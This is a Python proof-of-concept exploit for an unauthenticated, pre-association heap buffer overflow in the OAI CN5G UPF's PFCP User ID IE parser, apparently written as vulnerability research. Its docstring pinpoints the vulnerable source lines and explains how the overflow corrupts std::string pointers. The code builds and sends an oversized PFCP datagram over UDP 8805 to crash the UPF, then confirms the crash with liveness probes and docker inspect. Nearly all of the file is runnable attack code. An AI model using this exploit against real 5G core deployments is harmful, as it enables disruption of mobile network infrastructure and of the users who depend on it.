#!/usr/bin/env python3
"""
OAI CN5G UPF (oai-cn5g-upf, `simpleswitch` datapath) -- unauthenticated,
pre-association heap buffer overflow in the PFCP User ID IE parser.
Sink: src/common-src/pfcp/3gpp_29.244.hpp:8604-8637
      pfcp_user_id_ie::load_from()

    void load_from(std::istream& is) {
      is.read(reinterpret_cast<char*>(&u1.b), sizeof(u1.b));
      if (u1.bf.imsif) {
        is.read(reinterpret_cast<char*>(&length_of_imsi), sizeof(length_of_imsi));
        is.read(reinterpret_cast<char*>(imsi.u1.b), length_of_imsi);  // <-- SINK
        imsi.num_digits = length_of_imsi * 2;
        if ((imsi.u1.b[length_of_imsi - 1] & 0xF0) == 0xF0) { ... }   // b[-1] when len==0
      }
      ...
      if (u1.bf.msisdnf) {
        is.read(reinterpret_cast<char*>(&length_of_msisdn), sizeof(length_of_msisdn));
        is.read(reinterpret_cast<char*>(msisdn.u1.b), length_of_msisdn); // <-- SINK
      }
      ...
    }

`length_of_imsi` / `length_of_msisdn` are `uint8_t` values taken verbatim from
the wire (0..255), while the destinations are FIXED 8-byte arrays:

    src/common-src/3gpp/3gpp_29.274.h:393   #define IMSI_BCD8_SIZE 8
    src/common-src/3gpp/3gpp_29.274.h:394       uint8_t b[IMSI_BCD8_SIZE];
    src/common-src/3gpp/3gpp_29.274.h:718   #define MSISDN_MAX_LENGTH (15)
    src/common-src/3gpp/3gpp_29.274.h:737       uint8_t b[MSISDN_MAX_LENGTH / 2 + 1];  // == 8

=> up to 247 bytes written past the end of a heap-allocated
   `pfcp_user_id_ie` (allocated with `new` at
   src/common-src/pfcp/3gpp_29.244.cpp:820).

The overflow smashes the two `std::string` members (`imei`, `nai`) that sit
after `imsi` in the object.  Both are SSO-empty, so their internal `_M_p`
points into the object itself; overwriting it with attacker bytes turns the
subsequent `~basic_string()` into `operator delete(<attacker value>)`.

REACHABILITY (pre-authentication, pre-association):
    src/upf_app/app/upf_n4.cpp:684-700  upf_n4::handle_receive()
        try { msg.load_from(iss); handle_receive_pfcp_msg(...); }
        catch (pfcp_exception& e) { ...log... }
    `pfcp_msg::load_from()` (3gpp_29.244.hpp:480-506) parses EVERY IE in the
    datagram through `pfcp_ie::new_pfcp_ie_from_stream()` BEFORE any message
    dispatch, association lookup or SEID validation, and before the
    `ies_length != check_msg_length` sanity throw at :499.  The `catch` only
    handles `pfcp_exception`, which cannot intercept SIGSEGV/glibc abort.
    N4 is plain UDP/8805 with no TLS and no peer authentication.

Usage:
    python3 upf_pfcp_userid_heap_overflow_poc.py --target 172.30.0.7
    python3 upf_pfcp_userid_heap_overflow_poc.py --target <ip> --mode control
    python3 upf_pfcp_userid_heap_overflow_poc.py --target <ip> --field msisdn
    python3 upf_pfcp_userid_heap_overflow_poc.py --target <ip> --fill 41 --len 255

Requires only the Python 3 standard library.
"""

import argparse
import socket
import struct
import sys
import time

# ---- 3GPP TS 29.244 constants -------------------------------------------
PFCP_VERSION = 1
PFCP_HEARTBEAT_REQUEST = 1          # any type works: IEs are parsed pre-dispatch
PFCP_HEARTBEAT_RESPONSE = 2         # src/common-src/3gpp/3gpp_29.244.h:487
PFCP_IE_RECOVERY_TIME_STAMP = 96    # src/common-src/3gpp/3gpp_29.244.h:232
PFCP_IE_USER_ID = 141               # src/common-src/3gpp/3gpp_29.244.h:279

# User-ID IE flag octet bit layout (3gpp_29.244.hpp:8451-8461)
FLAG_IMSIF = 0x01
FLAG_IMEIF = 0x02
FLAG_MSISDNF = 0x04
FLAG_NAIF = 0x08

IMSI_BCD8_SIZE = 8                  # destination array size
MSISDN_BCD_SIZE = 8                 # MSISDN_MAX_LENGTH/2 + 1


def build_userid_ie(flag, length_octet, fill, extra_tail=b""):
    """Build a PFCP User ID IE whose declared IMSI/MSISDN length exceeds the
    8-byte destination array."""
    value = bytes([flag, length_octet]) + bytes([fill]) * length_octet
    value += extra_tail
    return struct.pack("!HH", PFCP_IE_USER_ID, len(value)) + value


def build_pfcp(message_type, ies, seq=1, seid=None):
    """Assemble a PFCP datagram.  `message_length` covers everything after the
    first 4 octets (SEID if present + 3-octet SN + 1 spare octet + IEs)."""
    flags = (PFCP_VERSION << 5)
    body = b""
    if seid is not None:
        flags |= 0x01               # S bit
        body += struct.pack("!Q", seid)
    body += struct.pack("!I", seq)[1:]      # 3-octet sequence number
    body += b"\x00"                         # spare octet
    body += ies
    return struct.pack("!BBH", flags, message_type, len(body)) + body


def build_liveness_probe(seq=1):
    """A PFCP Heartbeat Request carrying the mandatory Recovery Time Stamp IE.

    NOTE on the oracle: pfcp_l4_stack::handle_receive_message_cb()
    (src/pfcp/pfcp.cpp:150) logs "Failed to check Triggered message type,
    Silently discarding PFCP msg type 1, seq N" for a heartbeat whose sequence
    number is not one the UPF itself triggered, so a live UPF stays SILENT.
    The useful network-level signal is therefore the ICMP error that appears
    once the process is gone: ECONNREFUSED (ICMP port-unreachable, socket
    closed) or EHOSTUNREACH/ENETUNREACH (container removed from the bridge).
    A plain timeout means "still alive".  Confirm with `docker inspect`.
    """
    ie = struct.pack("!HH", PFCP_IE_RECOVERY_TIME_STAMP, 4)
    ie += struct.pack("!I", int(time.time()) & 0xFFFFFFFF)
    return build_pfcp(PFCP_HEARTBEAT_REQUEST, ie, seq=seq)


def upf_alive(t, p, seq=1, timeout=4):
    """Return (alive, state_string).

    alive == True  : the probe timed out, i.e. nothing answered but the host
                     still owns the address -> the UPF process is up.
    alive == False : an ICMP error came back, i.e. the socket/process/container
                     is gone.
    """
    dg = build_liveness_probe(seq)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((t, p))
        s.sendall(dg)
    except OSError as e:
        s.close()
        return False, "SEND-ERROR:%s" % e
    state = "TIMEOUT(host still there -> process alive)"
    alive = True
    try:
        r = s.recv(65535)
        if r and len(r) > 1 and r[1] == PFCP_HEARTBEAT_RESPONSE:
            state = "HEARTBEAT RESPONSE received"
            alive = True
        elif r:
            state = "unexpected reply %s" % r[:8].hex()
            alive = True
    except socket.timeout:
        pass
    except ConnectionRefusedError:
        alive = False
        state = "ICMP PORT UNREACHABLE (N4 socket gone -> process dead)"
    except OSError as e:
        alive = False
        state = "ICMP/OS ERROR %s (host unreachable -> container gone)" % e
    s.close()
    return alive, "%s [%.3fs]" % (state, time.time() - t0)


def send_one(target, port, datagram, timeout=5):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    t0 = time.time()
    s.sendto(datagram, (target, port))
    reply = None
    try:
        reply, _ = s.recvfrom(65535)
    except socket.timeout:
        pass
    except OSError:
        pass
    s.close()
    return reply, time.time() - t0


def hexdump(d, limit=64):
    out = []
    for i in range(0, min(len(d), limit), 16):
        chunk = d[i:i + 16]
        out.append("    %04x  %-47s  %s" % (
            i,
            " ".join("%02x" % b for b in chunk),
            "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)))
    return "\n".join(out)


# --------------------------------------------------------------------------
def run_control(t, p):
    """Differential control: a legal-length User ID IE must NOT kill the UPF.

    Same message type, same IE type, same code path -- the only difference from
    the attack is that the declared IMSI length fits the 8-byte destination.
    """
    ok0, st0 = upf_alive(t, p, seq=100)
    print("[*] PRE-FLIGHT liveness probe (Heartbeat + Recovery Time Stamp)")
    print("    -> %s ; alive=%s" % (st0, ok0))
    if not ok0:
        print("    !! UPF N4 already unreachable -- aborting control")
        return False

    print("\n[*] CONTROL -- PFCP User ID IE with a LEGAL IMSI length (8 octets)")
    ie = build_userid_ie(FLAG_IMSIF, IMSI_BCD8_SIZE, 0x41)
    dg = build_pfcp(PFCP_HEARTBEAT_REQUEST, ie)
    print("    datagram = %d bytes" % len(dg))
    print(hexdump(dg))
    r, el = send_one(t, p, dg)
    print("    -> reply=%s  elapsed=%.3fs" % (r.hex() if r else "NONE", el))
    print("       (NONE is expected: a User ID IE is illegal in a Heartbeat")
    print("        Request, so upf_n4 catches pfcp_msg_illegal_ie_exception.")
    print("        The UPF log line 'handle_receive exception ... Illegal IE")
    print("        141' proves the IE WAS parsed before any dispatch.)")
    time.sleep(1)
    ok1, st1 = upf_alive(t, p, seq=101)
    print("    -> post-control liveness probe: %s ; alive=%s" % (st1, ok1))
    print("    => UPF SURVIVED the legal-length control: %s" % ok1)
    return ok1


def run_attack(t, p, field="imsi", fill=0x41, length=255):
    flag = FLAG_IMSIF if field == "imsi" else FLAG_MSISDNF
    dest = "imsi.u1.b[8]" if field == "imsi" else "msisdn.u1.b[8]"
    dest_size = IMSI_BCD8_SIZE if field == "imsi" else MSISDN_BCD_SIZE
    print("\n[*] ATTACK -- PFCP User ID IE, declared %s length = %d"
          % (field.upper(), length))
    print("    destination = %s -> %d bytes written PAST the end of the array"
          % (dest, length - dest_size))
    print("    fill byte   = 0x%02x, chosen so the smashed std::string" % fill)
    print("                  pointer -- and therefore the faulting address --")
    print("                  is attacker-controlled and self-identifying")

    ok0, st0 = upf_alive(t, p, seq=200)
    print("    UPF state immediately before the attack: %s (alive=%s)" % (st0, ok0))

    ie = build_userid_ie(flag, length, fill)
    dg = build_pfcp(PFCP_HEARTBEAT_REQUEST, ie)
    print("    datagram = %d bytes, ONE unauthenticated UDP packet to %s:%d/udp"
          % (len(dg), t, p))
    print(hexdump(dg, limit=96))
    r, el = send_one(t, p, dg)
    print("    -> reply=%s  elapsed=%.3fs"
          % (r.hex() if r else "NONE (UPF never answered)", el))

    print("\n[*] POST-CRASH PROBING (8 x 3s)")
    dead = 0
    for i in range(8):
        time.sleep(3)
        ok, st = upf_alive(t, p, seq=201 + i)
        print("    probe %d -> %s" % (i + 1, st))
        if not ok:
            dead += 1
    print("    => UPF N4 reported gone on %d/8 probes" % dead)
    if dead == 0:
        print("       NOTE: a plain timeout is INCONCLUSIVE.  When the UPF")
        print("       process dies the container exits but docker keeps the")
        print("       bridge endpoint for a while, so ARP still resolves and")
        print("       the datagrams simply disappear.  The authoritative")
        print("       verdict comes from the container/kernel state below.")
    return dead >= 1


def docker_verdict(container):
    """Authoritative verdict: container exit code + host kernel log."""
    import subprocess
    print("\n[*] CONTAINER / KERNEL VERDICT")
    try:
        out = subprocess.run(
            ["docker", "inspect", "-f",
             "Status={{.State.Status}} ExitCode={{.State.ExitCode}} "
             "OOMKilled={{.State.OOMKilled}} FinishedAt={{.State.FinishedAt}}",
             container],
            capture_output=True, text=True, timeout=30)
        print("    docker inspect %s -> %s" % (container, out.stdout.strip()))
        crashed = "ExitCode=139" in out.stdout or "ExitCode=134" in out.stdout
    except Exception as e:
        print("    docker inspect unavailable (%s)" % e)
        crashed = None
    try:
        out = subprocess.run(["dmesg", "-T"], capture_output=True,
                             text=True, timeout=30)
        hits = [ln for ln in out.stdout.splitlines()
                if "oai_upf" in ln or ("segfault" in ln and "upf" in ln)]
        for ln in hits[-3:]:
            print("    dmesg: %s" % ln.strip())
    except Exception as e:
        print("    dmesg unavailable (%s)" % e)
    print("    (ExitCode 139 == 128+11 == SIGSEGV; 134 == 128+6 == SIGABRT"
          " from glibc malloc_printerr)")
    return crashed


def main():
    ap = argparse.ArgumentParser(
        description="OAI CN5G UPF PFCP User-ID IE heap overflow PoC")
    ap.add_argument("--target", required=True, help="UPF N4 IP or hostname")
    ap.add_argument("--port", type=int, default=8805, help="UPF N4 UDP port")
    ap.add_argument("--mode", default="all", choices=["all", "control", "attack"])
    ap.add_argument("--field", default="imsi", choices=["imsi", "msisdn"])
    ap.add_argument("--fill", type=lambda x: int(x, 16), default=0x41,
                    help="filler byte (hex), default 41 == 'A'")
    ap.add_argument("--len", dest="length", type=int, default=255,
                    help="declared IMSI/MSISDN length, 0..255 (default 255)")
    ap.add_argument("--container", default="oai-upf",
                    help="UPF container name for the authoritative "
                         "docker/kernel verdict (only works when the PoC is "
                         "run on the docker host; pass '' to skip)")
    a = ap.parse_args()

    if not 0 <= a.length <= 255:
        sys.exit("ERROR: --len must fit in the uint8_t wire field (0..255)")

    print("OAI CN5G UPF unauthenticated PFCP heap overflow PoC")
    print("  target = %s:%d/udp   mode=%s field=%s len=%d fill=0x%02x"
          % (a.target, a.port, a.mode, a.field, a.length, a.fill))
    print("  sink   = src/common-src/pfcp/3gpp_29.244.hpp:8609 / :8625")
    print("-" * 76)

    if a.mode in ("all", "control"):
        run_control(a.target, a.port)
    crashed = None
    if a.mode in ("all", "attack"):
        run_attack(a.target, a.port, a.field, a.fill, a.length)
        if a.container:
            crashed = docker_verdict(a.container)
        print("\n[*] VERDICT: UPF killed = %s" % crashed)
    print("-" * 76)
    print("Corroborating evidence to collect on the host:")
    print("  docker logs --tail 40 %s" % (a.container or "oai-upf"))
    print("    expected last two lines:")
    print("      handle_receive exception PFCP msg 0 Illegal IE 141 ...")
    print("      double free or corruption (out)")
    print("  docker logs %s | grep -c 'handle_receive(269 bytes)'"
          % (a.container or "oai-upf"))


if __name__ == "__main__":
    main()
